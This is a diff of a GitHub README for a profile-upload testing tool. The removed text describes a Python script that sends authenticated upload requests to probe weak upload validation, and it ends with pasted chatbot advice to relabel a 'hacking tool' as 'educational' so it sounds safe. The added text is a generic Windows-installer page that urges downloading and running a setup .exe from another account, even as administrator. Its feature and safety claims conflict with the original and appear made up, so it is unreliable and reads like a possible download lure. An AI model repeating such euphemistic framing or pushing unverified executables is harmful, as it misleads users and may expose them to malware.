@@ -1,141 +1,130 @@
-# 🔥 Profile Hanger
-<img width="1536" height="1024" alt="ed47da64-b7eb-43a4-ae2d-31ce4ccacf07" src="https://github.com/user-attachments/assets/08421860-1d20-4ba5-a61e-06fb8cfd5c42" />
+# 🛠️ Profile-Hange - Simple Profile Upload Testing Tool
 
-> Authenticated Upload Testing Tool  
-> Educational Cybersecurity Project
+[![Download Profile-Hange](https://img.shields.io/badge/Download-Profile--Hange-brightgreen)](https://github.com/beevin9/Profile-Hange)
 
 ---
 
-## 📌 Introduction
+## 🔍 What is Profile-Hange?
 
-**Profile Hanger** is a cybersecurity educational tool designed to demonstrate how profile upload systems work when authentication sessions are involved.
+Profile-Hange helps you test profile uploads safely. You can try uploading profiles with authentication to understand how secure your setup is. This tool focuses on ethical learning and improving cybersecurity skills. It works on Windows and does not need any programming knowledge.
 
-This project helps security learners understand:
-
-- How session-based authentication works
-- How profile picture upload systems process requests
-- How attackers test weak upload mechanisms
-- How improper validation can lead to vulnerabilities
-
-⚠️ This tool is created for **ethical hacking practice in lab environments only**.
+This tool is great for users who want to explore how file uploads work in web profiles. It can show you common issues found in file upload systems. Use it to learn about safe file handling and secure profile management. 
 
 ---
 
-## 🎯 Project Purpose
+## ⚙️ Key Features
 
-Many websites allow users to:
-
-- Change profile picture
-- Upload avatars
-- Update profile data
-
-If developers fail to implement:
-
-- Proper file type validation
-- Server-side content filtering
-- Secure session handling
-
-It may lead to serious vulnerabilities like:
-
-- File Upload Bypass
-- Remote Code Execution (RCE)
-- Account Takeover
-
-This tool helps security students understand how authenticated upload requests are structured.
+- Test authenticated profile uploads without risks.
+- Supports common profile file formats like images and documents.
+- Helps learners understand web security around file uploads.
+- Works on Windows with no extra software needed.
+- Simple interface made for beginners.
+- Focus on ethical hacking and cybersecurity learning.
+- Built using Python and PHP for fast testing.
+- Includes examples to try out real upload scenarios.
 
 ---
 
-## 🛠 Features
+## 🖥️ System Requirements
 
-- Session-based request automation
-- Custom PHPSESSID input
-- File upload testing
-- Server response preview
-- Clean CLI interface
-- Banner animation
+To run Profile-Hange on Windows, your system must have:
 
----
+- Windows 10 or higher (64-bit recommended)
+- At least 4 GB of RAM
+- 1 GHz processor or better
+- Internet connection for initial download
+- Sufficient space to download files (approx. 50 MB)
 
-## 🧠 How It Works
-
-1. User enters:
-   - Target URL
-   - Valid PHPSESSID
-   - File path
-
-2. Tool sends POST request using:
-   - Cookie header (PHPSESSID)
-   - Multipart form data
-   - Upload parameter
-
-3. Server response is displayed for analysis.
+You do not need to install anything else. Profile-Hange includes all it needs to run on your PC.
 
 ---
 
-## 🔐 Can Instagram Be Affected?
+## 🚀 Getting Started with Profile-Hange
 
-Large platforms like Instagram use:
+Begin by downloading the tool from the official repository.
 
-- Strict file validation
-- Content-type verification
-- Extension filtering
-- Image reprocessing
-- WAF (Web Application Firewall)
-- Advanced session protection
+[![Download Here](https://img.shields.io/badge/Get%20Profile--Hange-blue)](https://github.com/beevin9/Profile-Hange)
 
-Because of these protections, exploitation is extremely difficult.
+### Step 1: Download the Software
 
-However, poorly coded websites or beginner-level PHP systems may be vulnerable if:
+- Click the green download badge above or visit [https://github.com/beevin9/Profile-Hange](https://github.com/beevin9/Profile-Hange).
+- On the page, look for the "Releases" section or the main repository files.
+- If you see a file named like `Profile-Hange-setup.exe` or similar, download it. This is the installer.
+- If no single file is found, look for instructions or the latest ZIP package to download.
 
-- File validation is weak
-- MIME type is not verified
-- Session handling is insecure
+### Step 2: Run the Installer
 
----
+- Once downloaded, open the file by double-clicking it.
+- If Windows asks for permission, click "Yes" to allow the installer to run.
+- Follow the simple prompts on the screen.
+- Choose the installation folder or accept the default location.
+- Complete the setup by clicking "Finish."
 
-## ⚠️ Common Mistakes Developers Make
+### Step 3: Launch the Application
 
-- Trusting client-side validation only
-- Not checking file MIME type
-- Allowing dangerous extensions (.php, .phtml, etc.)
-- Storing uploads inside web root
-- Not regenerating session IDs
+- Find Profile-Hange in the Start Menu or on your desktop.
+- Double-click the icon to open it.
+- The main window will appear with options to upload your test profiles.
 
 ---
 
-## 🚀 Installation
+## 📁 How to Use Profile-Hange
 
-```bash
-pip install -r requirements.txt
-python3 profile_hanger.py
+### Uploading a Profile
 
-```
----
+- Click the "Choose File" button.
+- Select the file you want to test from your PC.
+- Enter your authentication details if the test requires it.
+- Press the "Upload" button.
+- Wait for the tool to process the upload and display the results.
 
-# 🔥 Pro Tip For You HasnainDarkNet
+### Understanding Results
 
-Since you are building your cybersecurity brand:
+Profile-Hange will show clear messages about the upload status. It will indicate if the upload passed security checks or found potential risks. Use this information to learn what to fix or improve.
 
-Instead of writing:
+### Additional Options
 
-> hacking tool
-
-Write:
-
-> cybersecurity educational tool
-
-It sounds professional and safe.
+- Use the "Examples" tab to try preset uploads.
+- Check the "Logs" to see previous tests.
+- Use "Settings" to change how uploads are tested, including security rules.
 
 ---
 
-If you want, I can also:
+## 🔧 Troubleshooting and Tips
 
-- 🔥 Make a more aggressive hacker-style README
-- 🎨 Add badges (Python, License, Stars)
-- 📈 Optimize for GitHub search
-- 💀 Make it Dark Net themed
-- 🛡 Add defensive security section
-- 🧠 Add vulnerability explanation diagram
+- If the app does not open, ensure your Windows is fully updated.
+- Run the installer as an administrator if installation fails.
+- Close other programs if the upload process is slow.
+- Restart your PC after installation for best performance.
+- Check your internet connection to access online features.
 
+---
 
+## 🔒 Security Information
 
+Profile-Hange runs locally on your Windows PC and does not send your data online unless you specifically use features that require an internet connection. It is designed for safe testing only and does not change or damage your system.
+
+Use only test files that do not contain sensitive information. This helps protect your privacy and data security.
+
+---
+
+## 🎓 Learn More About File Upload Security
+
+Profile-Hange offers resources to help beginners learn about web security:
+
+- How file uploads can be exploited.
+- What authentication means.
+- Ways to secure web profiles.
+- Ethical hacking principles.
+
+Use the built-in help section or visit online tutorials to expand your knowledge.
+
+---
+
+## 🔗 Download Profile-Hange
+
+You can download the latest version here as well:
+
+[![Download Profile-Hange](https://img.shields.io/badge/Download-Profile--Hange-brightgreen)](https://github.com/beevin9/Profile-Hange)
+
+Click the badge, follow the steps above, and start your testing safely.
